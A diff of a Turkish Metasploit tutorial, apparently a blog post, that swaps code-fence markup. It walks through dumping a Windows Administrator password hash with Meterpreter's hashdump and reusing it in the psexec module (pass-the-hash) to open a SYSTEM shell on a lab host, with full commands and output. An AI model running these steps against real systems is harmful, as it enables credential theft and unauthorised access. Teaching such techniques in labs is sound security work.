@@ -37,7 +37,7 @@ UYARI-2:
 
 Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve ```post/windows/gather/hashdump``` modülü ile sistemde hash değerleri bulunmak istenmektedir.
 
-```sh
+{% highlight shell %}
 [*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)
 
 meterpreter > run post/windows/gather/hashdump 
@@ -50,7 +50,7 @@ meterpreter > run post/windows/gather/hashdump
 
 Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
 meterpreter >
-```
+{% endhighlight %}
 
 Görüldüğü gibi, ```RHOST: 192.168.57.131``` IP adresinde bulunan Administrator kullanıcısına ait ```e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c``` değeri elde edilmiştir. 
 
@@ -60,7 +60,7 @@ Görüldüğü gibi, ```RHOST: 192.168.57.131``` IP adresinde bulunan Administra
 
 Önce ```msfconsole``` ile Metasploit Framework başlatalım ve ```psexec``` modülünü yükleyelim.
 
-```sh
+{% highlight shell %}
 root@kali:~# msfconsole
 
                 ##                          ###           ##    ##
@@ -122,13 +122,13 @@ Exploit target:
    Id  Name
    --  ----
    0   Automatic
-```
+{% endhighlight %}
 
 ## SMBPass
 
 Yukarıda görüldüğü gibi ```exploit/windows/smb/psexec``` modülünde ```SMBPass``` değişkenini girmemiz gerekmektedir. ```SMBPass``` değişkenine elimizde bulunan hash değerini girelim ve modülü ```exploit``` komutuyla çalıştıralım.
 
-```sh
+{% highlight shell %}
 msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 msf exploit(psexec) > exploit
@@ -158,6 +158,6 @@ Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 
 C:\WINDOWS\system32>
-```
+{% endhighlight %}
 
 Gördüğünüz gibi ```192.168.57.140``` IP adresinde oturum açılmıştır.
